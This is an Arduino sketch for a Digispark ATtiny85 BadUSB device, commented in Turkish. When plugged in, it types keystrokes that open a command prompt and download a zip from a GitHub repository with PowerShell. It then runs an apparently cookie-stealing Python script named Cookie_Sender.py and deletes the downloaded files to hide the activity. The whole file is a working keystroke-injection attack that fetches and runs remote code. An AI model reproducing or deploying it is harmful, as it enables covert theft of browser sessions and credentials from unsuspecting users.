#include <DigiKeyboard.h>

void safeType(const char *text) {
  while (*text) {
    DigiKeyboard.print(*text++);
    DigiKeyboard.delay(40);
  }
}

void pressEnter() {
  DigiKeyboard.sendKeyPress(KEY_ENTER);
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyPress(0);
  DigiKeyboard.delay(250);
}

void setup() {
  DigiKeyboard.delay(2000);

  // Win + R
  DigiKeyboard.sendKeyPress(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyPress(0);
  DigiKeyboard.delay(1000);

    // cmd aç
  safeType("cmd");
  pressEnter();
  DigiKeyboard.delay(1500);

    // powershell üzerinden zip indir
  safeType("powershell -Command \"Invoke-WebRequest -Uri 'https://github.com/rifatardarslan/Attiny85Tools/archive/refs/heads/main.zip' -OutFile 'Attiny85Tools.zip'\"");
  pressEnter();
  DigiKeyboard.delay(2000); // dosya boyutuna göre artırabilirsin

    // zip aç
  safeType("powershell -Command \"Expand-Archive -Path 'Attiny85Tools.zip' -DestinationPath '.'\"");
  pressEnter();
  DigiKeyboard.delay(2000);

    // klasöre gir
  safeType("cd Attiny85Tools-main");
  pressEnter();
  DigiKeyboard.delay(500);

    // requests kur
  safeType("pip3 install requests");
  pressEnter();
  DigiKeyboard.delay(10000);

    // python çalıştır
  safeType("python3 Cookie_Sender.py");
  pressEnter();
  DigiKeyboard.delay(8000); // Python scriptinin bitmesi için bekle

    // klasörden çık
  safeType("cd ..");
  pressEnter();
  DigiKeyboard.delay(500);

    // klasörü ve zip'i sil
  safeType("rmdir /s /q Attiny85Tools-main");
  pressEnter();
  DigiKeyboard.delay(1000);
  safeType("del Attiny85Tools.zip");
  pressEnter();
  DigiKeyboard.delay(1000);

    // exit
  safeType("exit");
  pressEnter();

}

void loop() {}
